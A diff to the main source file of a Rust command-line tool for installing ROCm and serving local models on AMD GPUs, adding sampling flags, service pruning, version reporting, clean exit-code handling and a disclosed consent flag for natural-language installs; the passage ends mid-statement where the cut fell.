@@ -4,6 +4,9 @@
 
 mod automations;
 mod bootstrap;
+mod chat_host_facts;
+mod cli_progress;
+mod cli_report;
 mod comfyui;
 mod dash;
 mod dash_seam;
@@ -40,7 +43,7 @@ use rocm_core::{
     model_catalog_platforms, model_recipe_featured, model_recipe_target_platform_label,
     normalize_therock_family, platform_matches_gfx_family,
     preferred_serve_engine_for_host_gpu_summary, prepend_runtime_path, process_is_running,
-    read_tcp_stream_to_string, resolve_builtin_model_recipe, resolve_model_recipe,
+    read_http_response_bounded, resolve_builtin_model_recipe, resolve_model_recipe,
     runtime_install_root_is_protected, runtime_path_is_same_or_inside,
     runtime_python_activation_hint, runtime_python_env_bin_dir, runtime_python_executable_in_env,
     shell_command_for_host, uv_cache_source, write_all_tcp_stream,
@@ -54,19 +57,20 @@ use rocm_engine_protocol::{
 };
 use serde::de::DeserializeOwned;
 use serde::{Deserialize, Serialize};
-use std::collections::{BTreeMap, VecDeque};
+use std::collections::{BTreeMap, HashMap, VecDeque};
 use std::ffi::OsString;
 use std::fmt::Write as _;
 use std::fs;
 use std::io::{self, BufRead, Read, Write};
 use std::net::{TcpStream, ToSocketAddrs};
 use std::path::{Path, PathBuf};
+use std::process::ExitCode;
 #[cfg(not(windows))]
 use std::process::ExitStatus;
 use std::process::{Command as ProcessCommand, Stdio};
 use std::sync::{Mutex, OnceLock};
 use std::thread;
-use std::time::Duration;
+use std::time::{Duration, SystemTime};
 
 static BUILTIN_ENGINE_ENV_LOCK: OnceLock<Mutex<()>> = OnceLock::new();
 
@@ -81,7 +85,7 @@ const SUPPORTED_ENGINES: [&str; 2] = ["lemonade", "vllm"];
     about = "ROCm AI Command Center CLI",
     long_about = "ROCm AI Command Center CLI: install ROCm, manage local inference engines, \
 and run OpenAI-compatible model servers on AMD GPUs.\n\n\
-Run `rocm` with no subcommand to open the interactive dashboard (TUI). Use `rocm examine` \
+Run `rocm` with no subcommand to open the interactive launcher (TUI). Use `rocm examine` \
 to check that your GPU and ROCm install are ready, then `rocm serve <model>` to start a server.",
     version,
     // The `chat` example was dropped from this list when `chat` became
@@ -93,7 +97,7 @@ rocm examine                      Check GPU, ROCm install, and engines\n  \
 rocm install sdk                  Install ROCm wheels into a managed environment\n  \
 rocm engines list                 Show the local inference engines available\n  \
 rocm model                        List models this machine can run\n  \
-rocm serve qwen2.5-7b-instruct    Start a local OpenAI-compatible server\n  \
+rocm serve qwen                   Start a local OpenAI-compatible server\n  \
 rocm services list                Show running model servers\n\n\
 Commands marked [preview] work but are outside the Tech Preview's supported\n\
 scope: treat them as unfinished and do not depend on their behaviour yet.\n\n\
@@ -143,6 +147,11 @@ enum Command {
         /// Emit the machine-readable diagnosis JSON.
         #[arg(long)]
         json: bool,
+        /// Diagnose a WSL distribution from the Windows host instead of this
+        /// machine. Needs nothing installed inside the distribution. Pass the
+        /// name only when more than one is installed.
+        #[arg(long, value_name = "NAME", num_args = 0..=1, default_missing_value = "")]
+        distro: Option<String>,
     },
     /// Apply a known fix by id (see `rocm diagnose`); run with no id to list fixes.
     ///
@@ -167,7 +176,8 @@ enum Command {
         #[arg(long)]
         device_index: Option<i64>,
     },
-    /// Print the rocm-cli version.
+    /// Print the rocm-cli version, release tag or branch, and commit hash,
+    /// plus the ROCm SDK and GPU driver this machine would use.
     Version,
     /// Generate a shell completion script for the given shell.
     Completions {
@@ -244,18 +254,33 @@ enum Command {
     /// configure a remote provider; the `local` provider talks to a running server.
     #[command(after_help = "EXAMPLES:\n  \
 rocm chat --prompt \"Explain ROCm in one sentence\"\n  \
-rocm chat --provider local --model qwen2.5-7b-instruct --prompt \"Hello\"\n  \
+rocm chat --provider local --model qwen --prompt \"Hello\"\n  \
 echo \"Summarize this\" | rocm chat --provider anthropic")]
     Chat {
         /// Assistant provider to use.
         #[arg(long)]
         provider: Option<Provider>,
-        /// Model name to request from the provider, such as qwen2.5-7b-instruct.
+        /// Model name to request from the provider, such as qwen.
         #[arg(long)]
         model: Option<String>,
         /// Prompt to send. If omitted, rocm-cli reads from standard input when possible.
         #[arg(long)]
         prompt: Option<String>,
+        /// Sampling temperature to send with the request (>= 0.0). Higher is more random.
+        // `allow_negative_numbers` on the numeric value flags below (`--temperature`,
+        // `--top-p`, `--max-tokens`) lets their space form (e.g. `--temperature -1`) reach
+        // the value parser for a clear range error, instead of clap rejecting the token as
+        // an unexpected argument. clap only treats a `-…` token as a number when the whole
+        // remainder parses as one, so a missing value (`--temperature --top-p 0.5`) or a
+        // malformed token (`--temperature -0.5abc`) still errors at parse time.
+        #[arg(long, allow_negative_numbers = true, value_parser = parse_non_negative_temperature)]
+        temperature: Option<f32>,
+        /// Nucleus sampling probability to send with the request (0.0-1.0).
+        #[arg(long = "top-p", allow_negative_numbers = true, value_parser = parse_unit_interval)]
+        top_p: Option<f32>,
+        /// Maximum number of tokens to generate in the response.
+        #[arg(long = "max-tokens", allow_negative_numbers = true, value_parser = parse_positive_u32)]
+        max_tokens: Option<u32>,
         #[arg(
             long,
             help = "Allow an OpenAI-compatible provider to request ROCm tool calls."
@@ -272,27 +297,39 @@ echo \"Summarize this\" | rocm chat --provider anthropic")]
     },
     /// Check for a newer ROCm package and optionally install it.
     ///
-    /// Without --apply, only reports whether an update is available. Pass --apply to
-    /// install it, and add --activate to make the new install the default afterward.
+    /// Without --apply or --dry-run, only reports whether an update is available.
+    /// Pass --dry-run to preview what --apply would do, --apply to install it, and
+    /// add --activate to make the new install the default afterward.
     #[command(after_help = "EXAMPLES:\n  \
 rocm update\n  \
+rocm update --dry-run\n  \
 rocm update --apply --activate\n  \
-rocm update --apply --dry-run")]
+rocm update --apply --dry-run\n  \
+rocm update --json")]
     Update {
         /// Install the selected update instead of only checking.
         #[arg(long)]
         apply: bool,
         /// Runtime key to update.
-        #[arg(long, requires = "apply")]
+        #[arg(long)]
         runtime: Option<String>,
         /// Use the updated ROCm install as the default after installing it.
-        #[arg(long, requires = "apply")]
+        #[arg(long)]
         activate: bool,
         /// Show what would happen without changing files.
-        #[arg(long, requires = "apply")]
+        #[arg(long)]
         dry_run: bool,
+        /// Accepted for consistency with other mutating commands; applying never prompts.
+        #[arg(long)]
+        yes: bool,
+        /// Print the check result as a single line of JSON instead of text.
+        #[arg(long, conflicts_with_all = ["apply", "dry_run"])]
+        json: bool,
+        /// Bound the version-check network calls to this many seconds each.
+        #[arg(long, requires = "json", conflicts_with = "apply", value_parser = clap::value_parser!(u64).range(1..))]
+        timeout_secs: Option<u64>,
     },
-    /// List, choose, add, or remove ROCm installs (runtimes).
+    /// List, choose, add, or remove ROCm runtimes.
     Runtimes {
         #[command(subcommand)]
         command: Option<RuntimesCommand>,
@@ -328,18 +365,18 @@ rocm model --verbose"
     /// server running, or Ctrl-C to stop it. Inspect or stop servers later with
     /// `rocm services`.
     #[command(after_help = "EXAMPLES:\n  \
-rocm serve qwen2.5-7b-instruct\n  \
-rocm serve qwen2.5-7b-instruct --engine vllm --port 8000\n  \
-rocm serve qwen2.5-7b-instruct --verbose --device gpu_required")]
+rocm serve qwen\n  \
+rocm serve qwen --engine vllm --port 8000\n  \
+rocm serve qwen --verbose --device gpu_required")]
     Serve {
         /// Model name, alias, or local model file path.
         model: String,
         /// Engine to use.
         #[arg(long, value_parser = SUPPORTED_ENGINES)]
         engine: Option<String>,
-        /// Device policy [possible values: gpu_required, gpu_preferred, cpu_only].
+        /// Device policy.
         #[arg(long)]
-        device: Option<String>,
+        device: Option<DevicePolicyArg>,
         /// GPU device to serve on: `auto` (default; first free GPU) or a single
         /// index like `1`.
         #[arg(long, value_name = "INDEX|auto")]
@@ -388,6 +425,21 @@ rocm serve qwen2.5-7b-instruct --verbose --device gpu_required")]
         // (`--gpu-memory-utilization --verbose`), which then fails loudly on parse.
         #[arg(long, value_name = "FRACTION", allow_hyphen_values = true)]
         gpu_memory_utilization: Option<String>,
+        /// Default sampling temperature for generation (>= 0.0).
+        // `allow_negative_numbers` on the numeric value flags below (`--temperature`,
+        // `--top-p`, `--max-tokens`) lets their space form (e.g. `--temperature -1`) reach
+        // the value parser for a clear range error, instead of clap rejecting the token as
+        // an unexpected argument. clap only treats a `-…` token as a number when the whole
+        // remainder parses as one, so a missing value (`--temperature --top-p 0.5`) or a
+        // malformed token (`--temperature -0.5abc`) still errors at parse time.
+        #[arg(long, allow_negative_numbers = true, value_parser = parse_non_negative_temperature)]
+        temperature: Option<f32>,
+        /// Default nucleus sampling probability for generation (0.0-1.0).
+        #[arg(long = "top-p", allow_negative_numbers = true, value_parser = parse_unit_interval)]
+        top_p: Option<f32>,
+        /// Default maximum number of tokens to generate per response.
+        #[arg(long = "max-tokens", allow_negative_numbers = true, value_parser = parse_positive_u32)]
+        max_tokens: Option<u32>,
         /// API key that clients must present to a public (non-loopback) endpoint.
         /// When binding a public interface and this is omitted, a strong key is
         /// generated automatically. Prefer the `ROCM_SERVE_API_KEY` environment
@@ -572,9 +624,23 @@ rocm install sdk --family gfx110X-all --dry-run")]
         /// Resolve the install plan without changing files.
         #[arg(long)]
         dry_run: bool,
-        /// Approve required system-package installs (such as OpenMPI for vLLM) without asking.
+        /// Approve replacing the current active default ROCm runtime (and
+        /// required system-package installs such as OpenMPI for vLLM) without
+        /// prompting; required outside an interactive terminal whenever a
+        /// managed runtime is already the active default — including when this
+        /// install targets a different GPU family or channel, which takes over
+        /// the active default just the same. An install with no active default
+        /// runtime never prompts.
         #[arg(long)]
         yes: bool,
+        /// Approve replacing the current active default ROCm runtime, and only
+        /// that: unlike --yes it does not approve system-package installs, so it
+        /// never runs sudo. ROCm CLI's own non-interactive surfaces (chat, MCP,
+        /// the dashboard) pass this, because they spawn `rocm` with no terminal
+        /// and so have no way to answer a sudo password prompt; a missing system
+        /// package stays a warning there, as it was before. --yes implies this.
+        #[arg(long)]
+        approve_replacing_active_default: bool,
     },
     /// Preview or install Linux AMD driver support.
     Driver {
@@ -637,22 +703,32 @@ rocm engines install vllm --reinstall")]
 
 #[derive(Subcommand, Debug)]
 enum RuntimesCommand {
-    /// Show ROCm installs known to ROCm CLI.
+    /// Show ROCm runtimes known to ROCm CLI.
     List,
-    /// Use the selected ROCm install by default.
+    /// Use the selected ROCm runtime by default.
     Activate {
         /// Runtime key or friendly runtime selector.
         runtime: String,
     },
-    /// Switch back to the previously selected ROCm install.
+    /// Switch back to the previously selected ROCm runtime.
+    #[command(
+        after_help = "NOTE: rollback has no history — it remembers only the runtime you just \
+left, so it cannot undo more than one activation."
+    )]
     Rollback,
-    /// Remove a ROCm install from ROCm CLI.
+    /// Remove a ROCm runtime from ROCm CLI.
     #[command(alias = "remove")]
     Uninstall {
         /// Runtime key or friendly runtime selector.
         runtime: String,
+        /// Do not ask for interactive confirmation.
+        #[arg(long)]
+        yes: bool,
+        /// Show what would be removed without deleting anything.
+        #[arg(long)]
+        dry_run: bool,
     },
-    /// Add a ROCm install from a saved manifest file.
+    /// Add a ROCm runtime from a saved manifest file.
     Import {
         /// Manifest file path.
         manifest: PathBuf,
@@ -736,7 +812,7 @@ enum ComfyuiCommand {
     },
     /// Install ComfyUI into ROCm CLI's app folder.
     Install {
-        /// ROCm runtime key to use.
+        /// ROCm runtime key or id to use (see `rocm runtimes list`).
         #[arg(long)]
         runtime_id: Option<String>,
         /// Reinstall even if ComfyUI already exists.
@@ -745,6 +821,9 @@ enum ComfyuiCommand {
         /// Show what would happen without changing files.
         #[arg(long)]
         dry_run: bool,
+        /// Accepted for consistency with other mutating commands; installing never prompts.
+        #[arg(long)]
+        yes: bool,
     },
     /// Start ComfyUI and print its local URL.
     Start {
@@ -757,9 +836,16 @@ enum ComfyuiCommand {
         /// Do not try to open a browser window.
         #[arg(long)]
         no_open_browser: bool,
+        /// Accepted for consistency with other mutating commands; starting never prompts.
+        #[arg(long)]
+        yes: bool,
     },
     /// Stop a ROCm CLI-managed ComfyUI server.
-    Stop,
+    Stop {
+        /// Accepted for consistency with other mutating commands; stopping never prompts.
+        #[arg(long)]
+        yes: bool,
+    },
 }
 
 #[derive(Subcommand, Debug)]
@@ -787,6 +873,46 @@ enum ServicesCommand {
     Restart {
         /// Service id from `rocm services list --all`.
         service_id: String,
+        /// Do not ask for confirmation.
+        #[arg(long)]
+        yes: bool,
+    },
+    /// Delete one local server record and its files.
+    ///
+    /// Only works on a record that is not running: stop the server first. The
+    /// record's details file, log, engine state file, and endpoint key file are
+    /// all deleted, so its log can no longer be read and it can no longer be
+    /// restarted.
+    Remove {
+        /// Service id from `rocm services list --all`.
+        service_id: String,
+        /// Do not ask for confirmation.
+        #[arg(long)]
+        yes: bool,
+    },
+    /// Delete local server records that are no longer running.
+    ///
+    /// Running servers are always left alone. Leftover files whose record is
+    /// already gone are cleaned up too.
+    Prune {
+        /// Only remove records and files untouched for at least this many hours.
+        ///
+        /// Age is measured from when the record file was last written — a stop,
+        /// a restart, or a status correction all count as touching it — so a
+        /// server that has only just stopped keeps its log and stays
+        /// restartable. Pass 0 to include everything that is not running.
+        #[arg(long, default_value_t = DEFAULT_SERVICE_PRUNE_MIN_AGE_HOURS)]
+        older_than_hours: u64,
+        /// Remove every record that is not running, however recent.
+        ///
+        /// The same thing as `--older-than-hours 0`, named so it can be reached
+        /// without knowing the age rule exists -- which is how most people will
+        /// arrive here, after the summary tells them recent records were kept.
+        #[arg(long, conflicts_with = "older_than_hours")]
+        any_age: bool,
+        /// Show what would be removed, without removing anything.
+        #[arg(long)]
+        dry_run: bool,
         /// Do not ask for confirmation.
         #[arg(long)]
         yes: bool,
@@ -889,8 +1015,15 @@ enum ConfigCommand {
 enum SetupCommand {
     /// Show first-time setup status.
     Status,
-    /// Reset setup so the next TUI launch shows first-time setup again.
-    Reset,
+    /// Clear recorded setup completion/dismissal state.
+    ///
+    /// Does not by itself re-trigger onboarding in the TUI; open it manually
+    /// from `rocm dash`'s Observe tab with `n`.
+    Reset {
+        /// Accepted for consistency with other mutating commands; resetting never prompts.
+        #[arg(long)]
+        yes: bool,
+    },
 }
 
 /// Which framework `rocm examine` should probe.
@@ -958,6 +1091,45 @@ enum TelemetryModeArg {
     Local,
     /// Disable telemetry collection entirely.
     Off,
+}
+
+/// User-facing `rocm serve --device` policy.
+///
+/// Modeled as a clap `ValueEnum` so invalid input is rejected by clap's usage
+/// validation (exit code 2, with the valid choices listed) rather than a generic
+/// application error (exit code 1) — matching how every other enum-style CLI
+/// argument behaves. The historical aliases (`auto`/`gpu` for `gpu_required`,
+/// `cpu` for `cpu_only`) stay accepted for backward compatibility but are hidden
+/// from the advertised list.
+#[derive(Clone, Copy, Debug, Eq, PartialEq, ValueEnum)]
+#[value(rename_all = "snake_case")]
+enum DevicePolicyArg {
+    /// Require a ROCm GPU; fail if none is usable (the default).
+    #[value(alias = "auto", alias = "gpu")]
+    GpuRequired,
+    /// Accepted for compatibility; behaves identically to `gpu_required`
+    /// (rocm serve has no CPU fallback path).
+    GpuPreferred,
+    /// Accepted but always rejected: rocm serve has no CPU fallback path, so
+    /// this exits with an error. Hidden from `--help`, shell completions and the
+    /// invalid-value suggestion list so it is never advertised as usable, while
+    /// still parsing so the deliberate rejection message is preserved.
+    #[value(alias = "cpu", hide = true)]
+    CpuOnly,
+}
+
+impl DevicePolicyArg {
+    /// Canonical policy string understood by [`parse_device_policy`]. Routing the
+    /// parsed variant back through the string keeps `parse_device_policy` the
+    /// single choke point that enforces the `cpu_only` rejection across every
+    /// caller, rather than adding a second conversion path that could bypass it.
+    const fn as_policy_str(self) -> &'static str {
+        match self {
+            Self::GpuRequired => "gpu_required",
+            Self::GpuPreferred => "gpu_preferred",
+            Self::CpuOnly => "cpu_only",
+        }
+    }
 }
 
 #[derive(Clone, Copy, Debug, Eq, PartialEq, ValueEnum)]
@@ -1050,7 +1222,84 @@ fn with_sigpipe_ignored<T>(f: impl FnOnce() -> T) -> T {
     f()
 }
 
-fn main() -> Result<()> {
+/// Marker error carrying `rocm fix`'s exit code back through `main()`'s
+/// ordinary return path, instead of calling `std::process::exit` mid-stack
+/// and skipping the `_log_guard` destructor held in `run()`.
+///
+/// `exit_code_for` recovers the code via `downcast_ref`, which searches the
+/// whole error chain — wrapping the `fix()` call with `.context(...)` is
+/// fine. What does break it is discarding this error instead of chaining it,
+/// e.g. `.map_err(|e| anyhow!("fix failed: {e}"))`, which loses the
+/// underlying type and silently falls through to the generic "Error: ..."
+/// branch instead of the carried exit code.
+#[derive(Debug)]
+struct FixExitCode(i32);
+
+impl std::fmt::Display for FixExitCode {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        write!(f, "fix exited with code {}", self.0)
+    }
+}
+
+impl std::error::Error for FixExitCode {}
+
+/// Marker error carrying a clap usage/parse error's exit code back through
+/// `main()`'s ordinary return path, for the same reason [`FixExitCode`]
+/// exists: `clap::Error::exit()` calls `std::process::exit` mid-stack, which
+/// would skip the `_log_guard` destructor held in `run()`. The error is
+/// printed at the point it's constructed (clap knows which stream and
+/// formatting a given error kind wants); this type only carries the exit
+/// code onward.
+#[derive(Debug)]
+struct ClapExitCode(i32);
+
+impl std::fmt::Display for ClapExitCode {
+    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
+        write!(f, "clap exited with code {}", self.0)
+    }
+}
+
+impl std::error::Error for ClapExitCode {}
+
+/// Print a clap usage/parse error on the stream and in the format clap itself
+/// chooses, then carry its exit code onward as a [`ClapExitCode`] instead of
+/// calling `err.exit()`, which would `std::process::exit` mid-stack and skip
+/// the `_log_guard` destructor.
+fn clap_exit_code(err: clap::Error) -> anyhow::Error {
+    let code = err.exit_code();
+    let _ = err.print();
+    ClapExitCode(code).into()
+}
+
+fn main() -> ExitCode {
+    exit_code_for(run())
+}
+
+/// Maps `run()`'s result to a process exit code, unwrapping a `FixExitCode`
+/// or `ClapExitCode` to its carried code and otherwise reproducing the
+/// standard `Result<(), anyhow::Error>` `Termination` behavior (print the
+/// error to stderr, exit 1).
+fn exit_code_for(result: Result<()>) -> ExitCode {
+    match result {
+        Ok(()) => ExitCode::SUCCESS,
+        Err(e) => {
+            if let Some(FixExitCode(code)) = e.downcast_ref::<FixExitCode>() {
+                ExitCode::from(*code as u8)
+            } else if let Some(ClapExitCode(code)) = e.downcast_ref::<ClapExitCode>() {
+                ExitCode::from(*code as u8)
+            } else {
+                // Match the standard `Result<(), E>` `Termination` behavior exactly:
+                // ignore a failed write here rather than `eprintln!`, which panics.
+                // A caller with a closed stderr pipe must still see exit code 1, not
+                // a panic that replaces it.
+                let _ = writeln!(io::stderr(), "Error: {e:?}");
+                ExitCode::FAILURE
+            }
+        }
+    }
+}
+
+fn run() -> Result<()> {
     reset_sigpipe();
 
     // Held for the whole process lifetime: dropping it flushes and stops the
@@ -1077,7 +1326,7 @@ fn main() -> Result<()> {
         // exit, instead of dumping a request plan from the natural-language
         // planner.
         if let Some(err) = command_invocation_error(&freeform_invocation.request_args) {
-            err.exit();
+            return Err(clap_exit_code(err));
         }
         return run_freeform(
             freeform_invocation.request_args.join(" "),
@@ -1090,11 +1339,12 @@ fn main() -> Result<()> {
         );
     }
 
-    dispatch(parse_cli())
+    dispatch(parse_cli()?)
 }
 
 /// Build the root `rocm` command with its top-level subcommands ordered
-/// alphabetically in `--help` output (EAI-7362).
+/// alphabetically in `--help` output (EAI-7362), and `-V`/`--version` reporting
+/// the same traceable string as `rocm version` (see [`cli_version_string`]).
 ///
 /// clap assigns each subcommand an incrementing display order in declaration
 /// order and renders the command list sorted by `(display_order, name)`.
@@ -1106,17 +1356,87 @@ fn main() -> Result<()> {
 /// subcommand *after* this runs and leaves it at that default, so matching the
 /// default here lets `help` sort into its alphabetical position instead of being
 /// pinned last. The regression test guards this if clap's default ever changes.
+///
+/// `display_name` only changes what `-V`/`--version` prints ahead of the
+/// version string — verified against `--help`'s `Usage:` line and `completions`
+/// output, both of which are generated from `Cli::command()` directly and so
+/// bypass this override.
 fn cli_command() -> clap::Command {
-    Cli::command().mut_subcommands(|sc| sc.display_order(999usize))
+    Cli::command()
+        .mut_subcommands(|sc| sc.display_order(999usize))
+        .version(cli_version_string())
+        .display_name("rocm-cli")
 }
 
 /// Parse process arguments through [`cli_command`] so `rocm --help` and
-/// `rocm help` list subcommands alphabetically. Mirrors the derived
-/// `Cli::parse()`, which builds from `Cli::command()` directly and therefore
-/// cannot pick up the reordering.
-fn parse_cli() -> Cli {
-    let matches = cli_command().get_matches();
-    Cli::from_arg_matches(&matches).unwrap_or_else(|err| err.exit())
+/// `rocm help` list subcommands alphabetically and `rocm -V`/`--version` print
+/// the traceable version string. Mirrors the derived `Cli::parse()`, which
+/// builds from `Cli::command()` directly and therefore cannot pick up either
+/// override.
+///
+/// Returns a [`ClapExitCode`]-carrying error instead of calling
+/// `clap::Error::exit()` directly, so `run()`'s caller can unwrap the code
+/// after `_log_guard` has dropped rather than mid-stack. This covers both
+/// places clap can fail here: `try_get_matches()` for an ordinary argv parse
+/// error (a bad flag, `--help`, a missing required argument — the common
+/// case), and `from_arg_matches()` for the derive step below it.
+fn parse_cli() -> Result<Cli> {
+    let matches = cli_command().try_get_matches().map_err(clap_exit_code)?;
+    Cli::from_arg_matches(&matches).map_err(clap_exit_code)
+}
+
+/// What every version-reporting surface (`-V`/`--version`, `rocm version`, and
+/// the MCP in-process handler) prints: the semantic version Cargo built, plus
+/// the git ref and commit hash [`build.rs`] embedded, additively — never a
+/// replacement, so a build with an "unknown" ref (no tag, no branch, no git)
+/// still reports a real version number rather than none at all.
+fn cli_version_string() -> String {
+    format!(
+        "{} ({}, {})",
+        env!("CARGO_PKG_VERSION"),
+        env!("ROCM_CLI_VERSION_REF"),
+        env!("ROCM_CLI_GIT_HASH")
+    )
+}
+
+/// `rocm version`: the traceable build string, plus the ROCm SDK and GPU
+/// driver this machine would actually use -- unlike `-V`/`--version` and the
+/// MCP fast path, which stay a single terse line for scripts and in-process
+/// callers.
+///
+/// "The ROCm SDK" prefers the active managed TheRock runtime (what `rocm`
+/// itself runs engines against), falling back to a detected but unmanaged
+/// system ROCm install -- the same precedence `rocm`'s freeform "ROCm status"
+/// answer already uses, just without its other, heavier probing.
+fn version() -> Result<()> {
+    println!("rocm-cli {}", cli_version_string());
+
+    let paths = AppPaths::discover()?;
+    let config = RocmCliConfig::load(&paths).unwrap_or_default();
+    let manifests = therock::load_runtime_manifests(&paths).unwrap_or_default();
+    match current_runtime_manifest(&config, &manifests) {
+        Some(manifest) => println!(
+            "ROCm SDK: {} ({})",
+            therock::runtime_version_display(&manifest.version),
+            manifest.install_root.display()
+        ),
+        None => match rocm_core::detect_legacy_rocm_sdk() {
+            Some((version, path)) => {
+                println!(
+                    "ROCm SDK: {version} (unmanaged install at {})",
+                    path.display()
+                );
+            }
+            None => println!("ROCm SDK: not detected"),
+        },
+    }
+
+    match rocm_core::detect_gpu_driver_version() {
+        Some(version) => println!("GPU driver: {version}"),
+        None => println!("GPU driver: not detected"),
+    }
+
+    Ok(())
 }
 
 /// Legacy `uv` cache location, used before the cache was colocated with the managed
@@ -1261,7 +1581,7 @@ fn setup(command: Option<SetupCommand>) -> Result<()> {
         SetupCommand::Status => {
             print!("{}", render_setup_status_text(&paths, &config)?);
         }
-        SetupCommand::Reset => {
+        SetupCommand::Reset { yes: _ } => {
             print!("{}", reset_setup_prompt_state(&paths, &mut config)?);
         }
     }
@@ -1289,7 +1609,7 @@ fn render_setup_status_text(paths: &AppPaths, config: &RocmCliConfig) -> Result<
     } else if config.onboarding_dismissed {
         "setup dismissed"
     } else {
-        "first-time setup will show"
+        "first-time setup available — open manually via `rocm dash`'s Observe tab with `n`"
     };
 
     let mut output = String::new();
@@ -1323,7 +1643,7 @@ fn reset_setup_prompt_state(paths: &AppPaths, config: &mut RocmCliConfig) -> Res
     config.setup.completed = false;
     config.save(paths)?;
     Ok([
-        "Setup will show again the next time you run `rocm`.",
+        "Onboarding will not reopen automatically — open it from `rocm dash`'s Observe tab with `n`.",
         "ROCm installs were not deleted.",
         "Installed ROCm folders, API keys, and provider settings were kept.",
         "",
@@ -1367,15 +1687,108 @@ fn execute_freeform_next_action(
     paths: &AppPaths,
     config: &RocmCliConfig,
 ) -> Result<()> {
-    let action = freeform_plan_next_action_with_context(request, paths, config)
-        .context("natural-language plan did not produce a structured tool call")?;
-    validate_freeform_execution_action(&action)?;
-    print!("{}", render_freeform_execution_header(&action));
+    let execution = prepare_freeform_execution(request, paths, config)?;
+    print!("{}", render_freeform_execution_header(&execution));
 
     let mut argv = vec!["rocm".to_owned()];
-    argv.extend(action.args);
+    argv.extend(execution.action.args);
     let cli = Cli::try_parse_from(argv)?;
     dispatch(cli)
+}
+
+/// The argv `execute_freeform_next_action` is about to dispatch, plus whether
+/// [`apply_freeform_execution_consent`] added a flag to it.
+///
+/// The flag is tracked rather than re-detected from `action.args` because the
+/// execution header uses it to tell the operator *why* its `tool_call:` differs
+/// from the one in the request plan above. Looking for the flag in the final
+/// argv would report "added here" for a plan that already carried it.
+pub(crate) struct FreeformExecution {
+    pub action: FreeformPlanAction,
+    pub consent_added: bool,
+}
+
+/// Everything `execute_freeform_next_action` decides before it hands the argv to
+/// clap: plan, refuse what must not run unattended, and grant the consent the
+/// outer `--yes` already carries.
+///
+/// Split out so the consent injection is reachable from a test without
+/// dispatching a real install — the header render and the `dispatch` call are
+/// all that is left above it.
+fn prepare_freeform_execution(
+    request: &str,
+    paths: &AppPaths,
+    config: &RocmCliConfig,
+) -> Result<FreeformExecution> {
+    let mut action = freeform_plan_next_action_with_context(request, paths, config)
+        .context("natural-language plan did not produce a structured tool call")?;
+    validate_freeform_execution_action(&action)?;
+    let consent_added = apply_freeform_execution_consent(&mut action.args);
+    Ok(FreeformExecution {
+        action,
+        consent_added,
+    })
+}
+
+/// Grant the generated tool call the consent the operator already gave on the
+/// outer command line.
+///
+/// Only ever reached from `run_freeform` with `approve` set, i.e. from
+/// `rocm --yes <natural-language request>`. The planner builds a bare
+/// `install sdk ...` argv and `execute_freeform_next_action` re-parses and
+/// dispatches it **in process**, so `install()` would otherwise run with
+/// `yes = false, approve_replacing_active_default = false` no matter what the
+/// outer invocation said. That made this surface print `approval: granted by
+/// --yes` and then, with an active default runtime, refuse with "re-run with
+/// `--approve-replacing-active-default`" — a flag this surface offers no way to
+/// pass — or prompt on a terminal it had just said it did not need to ask.
+///
+/// Not `--yes`, for the same reason every other internal caller picks the narrow
+/// flag: `--yes` on `install sdk` carries a second, unrelated consent for
+/// system-package installs that run `sudo`, and the outer `--yes` here means
+/// "execute the plan you were just shown", not "install system packages".
+///
+/// Injected before the execution header renders, so the printed `tool_call:` is
+/// the argv that actually runs, and skipped under `--dry-run`, which returns
+/// before the gate and needs no consent — matching the dry-run-aware arms in
+/// `chat_rocm_command_action_from_args`, `rocmd` and dash-tui. The plan
+/// rendering path is deliberately untouched: `rocm <request>` without `--yes`
+/// prints a command for a human to review, and it must not hand them a
+/// pre-approved one.
+///
+/// That leaves `rocm --yes <request>` printing two `tool_call:` lines that
+/// differ — `run_freeform` renders the plan section before calling
+/// `execute_freeform_next_action`, and the flag is injected between them — and
+/// that is also deliberate. The two sections report different things: "request
+/// plan" is what the planner derived from the request, and "execution" is the
+/// argv handed to clap, so the added consent showing up only under the
+/// `execution` header is how this surface discloses that it granted it. Nothing
+/// is being solicited in between; under `--yes` the operator already approved
+/// on the outer command line, and under no `--yes` the execution section is
+/// never reached, so neither line is an approval prompt whose subject could
+/// drift from what runs. Injecting into the plan render instead would have to
+/// reach `render_structured_request_plan`, which the no-`--yes` review path
+/// shares, and would print a pre-approved command to a human being asked to
+/// review it — the case the paragraph above rules out.
+///
+/// So the difference stays deliberate but stops being unexplained: this returns
+/// whether it actually added the flag, and the execution section says so in
+/// words. A doc comment reaches the next reader of this file; the operator
+/// looking at two `tool_call:` lines that disagree is the one who needs it.
+///
+/// Returns `true` only when the flag was not already present, so the disclosure
+/// is about a flag this function added and not one the argv arrived with.
+fn apply_freeform_execution_consent(args: &mut Vec<String>) -> bool {
+    let is_install_sdk = args.first().is_some_and(|arg| arg == "install")
+        && args.get(1).is_some_and(|arg| arg == "sdk");
+    if !is_install_sdk || args.iter().any(|arg| arg == "--dry-run") {
+        return false;
+    }
+    let already_present = args
+        .iter()
+        .any(|arg| arg == "--approve-replacing-active-default");
+    ensure_flag(args, "--approve-replacing-active-default");
+    !already_present
 }
 
 fn validate_freeform_execution_action(action: &FreeformPlanAction) -> Result<()> {
@@ -1393,7 +1806,8 @@ fn validate_freeform_execution_action(action: &FreeformPlanAction) -> Result<()>
     Ok(())
 }
 
-fn render_freeform_execution_header(action: &FreeformPlanAction) -> String {
+fn render_freeform_execution_header(execution: &FreeformExecution) -> String {
+    let action = &execution.action;
     let mut output = String::new();
     let _ = writeln!(output);
     let _ = writeln!(output, "execution");
@@ -1411,6 +1825,20 @@ fn render_freeform_execution_header(action: &FreeformPlanAction) -> String {
         "  tool_call: {}",
         format_structured_tool_call("rocm", &action.args)
     );
+    // Printed only when the two `tool_call:` lines actually disagree, and
+    // immediately under the one that runs. Without it the operator sees a
+    // consent flag on the executed command that the request plan above never
+    // showed, with nothing on screen saying where it came from — the natural
+    // reading being that something was approved behind their back rather than
+    // that their own `--yes` was carried through.
+    if execution.consent_added {
+        let _ = writeln!(
+            output,
+            "  note: --approve-replacing-active-default was added here from your --yes, so this \
+             tool_call differs from the one under `request plan` above; nothing was approved \
+             between them."
+        );
+    }
     output
 }
 
@@ -1592,17 +2020,23 @@ fn dispatch(cli: Cli) -> Result<()> {
 
     match cli.command {
         Some(Command::Examine { json, framework }) => examine(json, framework.into()),
-        Some(Command::Diagnose { symptom, top, json }) => diagnose(symptom, top, json),
+        Some(Command::Diagnose {
+            symptom,
+            top,
+            json,
+            distro,
